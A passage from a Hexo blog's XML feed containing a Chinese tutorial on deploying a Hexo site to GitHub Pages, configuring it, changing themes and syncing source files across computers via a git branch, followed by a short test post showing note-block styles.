<p><code>id_rsa</code>是你这台电脑的私人秘钥，<code>id_rsa.pub</code>是公钥，在GitHub的setting中点击<code>New SSH key</code>把你的<code>id_rsa.pub</code>里面的信息复制进去<br>查看是否成功</p>          </div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><h3 id="6-将hexo部署到GitHub"><a href="#6-将hexo部署到GitHub" class="headerlink" title="6.将hexo部署到GitHub"></a>6.将hexo部署到GitHub</h3><div class="note info no-icon">            <p>这一步我们将hexo和GitHub关联起来，把hexo生成的文章部署到GitHub上，打开myblog中的<code>_config.yml</code>,翻到最后，修改一下<br>YourgithubName就是你GitHub的账户</p>          </div><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/YourgithubName/YourgithubNmae.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><p>注意冒号后面要空格<br>这个时候要先安装deploy-git，也就是部署命令，这样你才能用命令部署到GitHub.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --seve</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><div class="note info no-icon">            <p><code>hexo clean</code>是清除缓存，也可以不加<br><code>hexo generate</code>生成静态文章，可以缩写为<code>hexo g</code><br><code>hexo deploy</code>部署文章，可以缩写为<code>hexo d</code><br>注意deploy是要输入你的username和password<br>没有报错就说明部署成功了，过一会儿就可以在<code>https://yourname.github.io</code>这个网站看到你的博客了<br>这个时候我们发现每次deploy的时候都要输入username和password，我们可以打开站点配置文件<code>_config.yml</code>把我们之前修改的<code>repo: https://github.com/YourgithubName/YourgithubName.github.io.git</code>修改为</p>          </div><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">repo:</span> <span class="string">git@github.com:YourgithubName/YourgithubName.github.io.git</span></span><br></pre></td></tr></table></figure><p>这样就不用每次都输入username和password了。</p><h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h1><p>hexo基本配置、主题更换等</p><h2 id="1-hexo基本配置"><a href="#1-hexo基本配置" class="headerlink" title="1.hexo基本配置"></a>1.hexo基本配置</h2><p>在myblog文件夹目录下的<code>_config.yml</code>，就是整个hexo框架的基本配置文件了，可以在这里修改大部分的配置文件。详细可参考<a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">官方的配置</a>描述。</p><h3 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h3><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>title</code></td><td align="center">网站标题</td></tr><tr><td align="center"><code>subtitle</code></td><td align="center">网站副标题</td></tr><tr><td align="center"><code>description</code></td><td align="center">网站描述</td></tr><tr><td align="center"><code>author</code></td><td align="center">你的名字</td></tr><tr><td align="center"><code>language</code></td><td align="center">网站使用的语言</td></tr><tr><td align="center"><code>timezone</code></td><td align="center">网站时区，默认使用电脑时区</td></tr></tbody></table><p>其中，<code>description</code>主要用于SEO，告诉搜索引擎一个关于你站点的简单描述，通常建议包含你网站的关键词。<code>author</code>参与用于主题显示文章的作者。 </p><h3 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h3><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>url</code></td><td align="center">网址</td></tr><tr><td align="center"><code>root</code></td><td align="center">网站根目录</td></tr><tr><td align="center"><code>permalink</code></td><td align="center">文章的<a href="https://hexo.io/zh-cn/docs/permalinks" target="_blank" rel="noopener">永久链接</a>格式</td></tr><tr><td align="center"><code>permalink_defaults</code></td><td align="center">永久链接中各部分的默认值</td></tr></tbody></table><p>这里需要把<code>url</code>改成你的网站域名  </p><p>permalink，也就是你生成某个文章时的那个链接格式  </p><p>比如我新建一个文章叫<code>temp.md</code>，那么这个时候他自动生成的地址就是<br><code>http://yoursite.com/2018/09/05/temp</code>  </p><p>以下是官方给出的示例，关于链接的变量还有很多，需要的可以去官网上查找。</p><table><thead><tr><th align="center">参数</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center"><code>:year/:month/:day/:title/</code></td><td align="center">2013/0714/hello-world</td></tr><tr><td align="center"><code>:year-:month-:day:title.html</code></td><td align="center">2013-07-14-hello-world.html</td></tr><tr><td align="center"><code>:category/:title</code></td><td align="center">foo/bar/hello-world</td></tr></tbody></table><p>再往下翻，中间这些都默认就好了。</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">landscape</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deploymen.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">&lt;repository</span> <span class="string">url&gt;</span></span><br><span class="line">  <span class="attr">barnch:</span> <span class="string">[branch]</span></span><br></pre></td></tr></table></figure><div class="note info no-icon">            <p><code>theme</code>就是选择主题，也就是在<code>theme</code>这个文件夹下，在官网有很多<a href="https://hexo.io/themes/" target="_blank" rel="noopener">主题</a>，可以自行下载放在<code>theme</code>这个文件夹下，在修改主配置文件的<code>theme</code>参数就可以了，默认安装的是<code>lanscape</code>这个主题。  </p><p>接下来这个<code>deploy</code>就是网站的部署，<code>repo</code>就是仓库(<code>Repository</code>)的简写。<code>branch</code>选择仓库的哪个分支。这个之前已经修改过了，不在赘述，在后面双平台部署的时候会再次用到。</p>          </div><h3 id="Front-matter"><a href="#Front-matter" class="headerlink" title="Front-matter"></a>Front-matter</h3><p>Front-matter是文件最上方以<code>---</code>分隔的区域，用于指定个别文件的变量，举例来说：</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hello</span> <span class="string">Word</span></span><br><span class="line"><span class="attr">deat:</span> <span class="number">2013</span><span class="string">/7/13</span> <span class="number">20</span><span class="string">:46:25</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>下面是预先定义的参数，你可以在模板中使用这些参数值并加以利用。</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>layout</code></td><td align="center">布局</td></tr><tr><td align="center"><code>title</code></td><td align="center">标题</td></tr><tr><td align="center"><code>date</code></td><td align="center">建立时间</td></tr><tr><td align="center"><code>update</code></td><td align="center">更新时间</td></tr><tr><td align="center"><code>comments</code></td><td align="center">开启文章的评论功能</td></tr><tr><td align="center"><code>tags</code></td><td align="center">标签(不适用于分页)</td></tr><tr><td align="center"><code>categories</code></td><td align="center">分类(不适用于分页)</td></tr><tr><td align="center"><code>permalink</code></td><td align="center">覆盖文章网址</td></tr></tbody></table><p>其中，分类和标签需要区别一下，分类具有顺序性和层次性，也就是说<code>Foo,Bar</code>不等于<code>Bar,Foo</code>;而标签没有顺序性和层次性。</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">categories:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">Diary</span></span><br><span class="line"> <span class="attr">tags:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">PS3</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">Games</span></span><br></pre></td></tr></table></figure><h3 id="layout（布局）"><a href="#layout（布局）" class="headerlink" title="layout（布局）"></a>layout（布局）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new paper</span><br></pre></td></tr></table></figure><div class="note info no-icon">            <p>他其实是默认使用的是<code>post</code>这个布局，也就是<code>source</code>文件夹下的<code>_post</code>里面  </p><p>Hexo有三种默认布局：<code>post</code>、<code>page</code>和<code>draft</code>，它们分别对应不同的路径，而你自定义的其他布局和<code>post</code>相同，都将存储到<code>source/_post</code>文件夹。</p>          </div><table><thead><tr><th align="center">布局</th><th align="center">路径</th></tr></thead><tbody><tr><td align="center"><code>post</code></td><td align="center"><code>source/_post</code></td></tr><tr><td align="center"><code>page</code></td><td align="center"><code>source</code></td></tr><tr><td align="center"><code>draft</code></td><td align="center"><code>source/_drafts</code></td></tr></tbody></table><p>而new这个命令其实是:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new [layout]&lt;title&gt;</span><br></pre></td></tr></table></figure><p>只不过这个layout默认是post罢了。</p><h3 id="page"><a href="#page" class="headerlink" title="page"></a>page</h3><p>如果你想另起一页，那就可以使用</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page board</span><br></pre></td></tr></table></figure><p>系统会自动给你的source文件夹下创建一个board文件夹，以及board文件夹中的index.md，这样你访问的board对应的链接就是<code>http://xxx.xxx/board</code></p><h3 id="draft"><a href="#draft" class="headerlink" title="draft"></a>draft</h3><p>draft是草稿的意思，也就是你想写文章，又不希望被看到，那么可以</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new draft newpage</span><br></pre></td></tr></table></figure><p>这样会在source/_draft中新建一个newpage.mad文件，如果你的草稿文件写的过程中，想要预览一下，那么可以使用</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo server --draft</span><br></pre></td></tr></table></figure><p>如果你的草稿写完了，想要发表到post中</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo publish draft newpage</span><br></pre></td></tr></table></figure><p>就会自动把newpage.md发送到post中。</p><h2 id="2-更换主题"><a href="#2-更换主题" class="headerlink" title="2.更换主题"></a>2.更换主题</h2><p>到这里，如果你觉得默认的<code>landscape</code>主题不好看，那么可以在<a href="https://hexo.io/themes/" target="_blank" rel="noopener">官网的主题</a>中，选择你喜欢的一个主题修改就可以啦。<br><img alt data-src="/img/hexo%E6%90%AD%E5%BB%BA%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/theme.png" class="lazyload"><br>这里有200多个主题可选，最受欢迎的也就那么几个，不如<a href="https://theme-next.org/" target="_blank" rel="noopener">NexT主题</a>，非常的简洁好看，大多数人都选择这个，关于这个的教程也比较多。我用的是<a href="https://jerryc.me/" target="_blank" rel="noopener">butterfly</a>这个主题，这个主题比较炫酷，我会在后面详细的讲解butterfly这个主题的一些配置。</p><h2 id="3-git分支进行多终端工作"><a href="#3-git分支进行多终端工作" class="headerlink" title="3.git分支进行多终端工作"></a>3.git分支进行多终端工作</h2><p>问题来了，如果你现在在你的笔记本上写博客，部署在了网站上，那么你在家里用台式主机，或者办公室的台式机，发现你电脑里面没有博客文件，或者要换电脑了，最后不知道怎么移动文件，怎么办？  </p><p>在这里我们就可以利用git的分支系统进行多终端工作了，这样每次打开不一样的电脑，只需要进行简单的配置在github上把文件同步下来，就可以无缝操作了。</p><h3 id="机制"><a href="#机制" class="headerlink" title="机制"></a>机制</h3><p>机制是这样的，由于<code>hexo d</code>上传部署到github的其实是hexo编译后的文件，是用来生成网页的，不包含源文件。  </p><p><img alt data-src="/img/hexo%E6%90%AD%E5%BB%BA%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/html.png" class="lazyload"><br>可以看到，并没有source等源文件在内  </p><div class="note info no-icon">            <p>也就是上传的是本地目录里自动生成的<code>.deploy_git</code>里面。<br>其他文件，包括我们写在source里面的，和配置文件，主题文件，都没有上传到github<br>所以可以利用git的分支管理，将源文件上传至github的另一个分支即可。</p>          </div><h3 id="上传分支"><a href="#上传分支" class="headerlink" title="上传分支"></a>上传分支</h3><p>首先，先在github上新建一个分支，然后在这个仓库的setting中，选择默认分支为hexo分支（每次同步的时候就不用制定分支，比较方便）。  </p><p>然后在本地的任意目录下，打开git bsah</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.cm:yourname/yourname.github.io.git</span><br></pre></td></tr></table></figure><p>将其克隆到本地，因为默认分支已经设成了hexo，所以clone时只克隆了hexo。  </p><p>接下来在克隆到本地的<code>yourname.gitbhu.io</code>中，把除了.git文件夹外的所有文件都删掉  </p><p>把之前我们写的博客源文件全部复制过来，除了<code>.deploy_git</code>。复制过来的源文件应该有一个<code>.gitignore</code>，用来忽略一些不需要的文件，如果没有的话，自己新建一个，在里面写上如下，表示这类文件不需要git:</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">.DS_Store</span></span><br><span class="line"> <span class="string">Thumbs.db</span></span><br><span class="line"> <span class="string">db.json</span></span><br><span class="line"> <span class="string">*.log</span></span><br><span class="line"> <span class="string">node_modules/</span></span><br><span class="line"> <span class="string">public/</span></span><br><span class="line"> <span class="string">.deploy*/</span></span><br></pre></td></tr></table></figure><p>注意，如果你之前克隆过theme中的主题文件，那么应该把主题文件中的<code>.git</code>文件夹删掉，因为git不能嵌套上传，最好是显示影藏文件，检查一下有没有，否则上传的时候会出错，导致你的主题文件无法上传，这样你的配置就在别的电脑上用不了了。  </p><p>而后</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add</span><br><span class="line">git commit -m <span class="string">"add branch"</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p>这样就上传完了，可以去你的github上看一看hexo分支有没有上传上去，其中<code>mode_modules</code>、<code>public</code>、<code>db.json</code>已经被忽略了，没有关系，不需要上传，因为在别的电脑上需要重新输入命令安装。</p><h3 id="更新电脑操纵"><a href="#更新电脑操纵" class="headerlink" title="更新电脑操纵"></a>更新电脑操纵</h3><p>一样的，跟之前的环境搭建一样  </p><ul><li>安装git<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure></li><li>设置git全局邮箱和用户名<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">"yourgithubname"</span></span><br><span class="line">git config --global user.email <span class="string">"yourgithubemail"</span></span><br></pre></td></tr></table></figure></li><li>设置 ssh key<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">"youremail"</span></span><br><span class="line"><span class="comment">#验证是否成功</span></span><br><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure></li><li>安装nodejs<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt-get install npm</span><br></pre></td></tr></table></figure></li><li>安装hexo<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo npm install hexo-cli -g</span><br></pre></td></tr></table></figure>但是不需要初始化了  </li></ul><p>直接在任意文件夹下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@..........</span><br></pre></td></tr></table></figure><p>然后进入克隆到的文件夹：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> xxx.github.io</span><br><span class="line">npm install</span><br><span class="line">npm install hexo-deployer-git --seve</span><br></pre></td></tr></table></figure><p>生成，部署:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>然后就可以开始写你的新博客了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new newpage</span><br></pre></td></tr></table></figure><h3 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h3><p>  1.不要忘了，每次写完最好都把源文件上传一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">"xxx"</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p>  2.如果是已经编辑过的电脑上，已经有了clone文件夹了，那么，每次只要和远端同步一下就可以了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>到这里我们的博客差不多已经做完了。我也是参考其他博主的博客搭建的。  </p><p>在后面会对Butterfly主题配置进行一个详细的讲解，以及域名绑定在GitHub Page和Coding Page双平台部署实现国内外分析的详细讲解  </p><p><strong>文章参考</strong>:<a href="https://blog.csdn.net/sinat_37781304/article/details/82729029" target="_blank" rel="noopener">https://blog.csdn.net/sinat_37781304/article/details/82729029</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="网站搭建" scheme="https://c-hasel.github.io/categories/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="hexo" scheme="https://c-hasel.github.io/tags/hexo/"/>
    
      <category term="博客搭建" scheme="https://c-hasel.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>not_test1</title>
    <link href="https://c-hasel.github.io/2019/11/29/not-test1/"/>
    <id>https://c-hasel.github.io/2019/11/29/not-test1/</id>
    <published>2019-11-29T05:14:24.000Z</published>
    <updated>2022-06-14T16:07:11.473Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><div class="note default">            <h4 id="Default-Header"><a href="#Default-Header" class="headerlink" title="Default Header"></a>Default Header</h4><p>Welcome to <a href="https://hexo.io" target="_blank" rel="noopener">Hexo!</a></p>          </div><div class="note primary">            <h4 id="Primary-Header"><a href="#Primary-Header" class="headerlink" title="Primary Header"></a>Primary Header</h4><p><strong>Welcome</strong> to <a href="https://hexo.io" target="_blank" rel="noopener">Hexo!</a></p>          </div><div class="note info">            <h3 id="Info-Header"><a href="#Info-Header" class="headerlink" title="Info Header"></a>Info Header</h3><p><strong>Welcome</strong> to <a href="https://hexo.io" target="_blank" rel="noopener">Hexo!</a></p>          </div><div class="note success">            <h4 id="Success-Header"><a href="#Success-Header" class="headerlink" title="Success Header"></a>Success Header</h4><p><strong>Welcome</strong> to <a href="https://hexo.io" target="_blank" rel="noopener">Hexo!</a></p>          </div><div class="note warning">            <h4 id="Warning-Header"><a href="#Warning-Header" class="headerlink" title="Warning Header"></a>Warning Header</h4><p><strong>Welcome</strong> to <a href="https://hexo.io" target="_blank" rel="noopener">Hexo!</a></p>          </div><div class="note danger">            <h4 id="Danger-Header"><a href="#Danger-Header" class="headerlink" title="Danger Header"></a>Danger Header</h4><p><strong>Welcome</strong> to <a href="https://hexo.io" target="_blank" rel="noopener">Hexo!</a></p>          </div><div class="note info no-icon">            <h4 id="No-icon-note"><a href="#No-icon-note" class="headerlink" title="No icon note"></a>No icon note</h4><p>Note <strong>without</strong> icon: <code>note info no-icon</code><br>note info, note info, note info<br>note info, note info, note info<br>note info, note info, note info</p>          </div><div class="note success">            <h4 id="Codeblock-in-note"><a href="#Codeblock-in-note" class="headerlink" title="Codeblock in note"></a>Codeblock in note</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code block in note tag</span><br><span class="line">code block in note tag</span><br><span class="line">code block in note tag</span><br></pre></td></tr></table></figure>          </div><div class="note default">            <h4 id="Lists-in-note"><a href="#Lists-in-note" class="headerlink" title="Lists in note"></a>Lists in note</h4><ul><li>ul</li><li>ul<ul><li>ul</li><li>ul</li></ul></li><li>ul</li></ul><ol><li>ol</li><li>ol<ol><li>ol</li><li>ol</li></ol></li><li>ol</li></ol>          </div><h4 id="Table-in-Note"><a href="#Table-in-Note" class="headerlink" title="Table in Note"></a>Table in Note</h4><div class="note default">            <table><thead><tr><th>1</th><th>2</th></tr></thead><tbody><tr><td>3</td><td>4</td></tr><tr><td>5</td><td>6</td></tr><tr><td>7</td><td>8</td></tr></tbody></table>          </div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="test" scheme="https://c-hasel.github.io/categories/test/"/>
    
    
      <category term="test" scheme="https://c-hasel.github.io/tags/test/"/>
    
  </entry>
  
</feed>
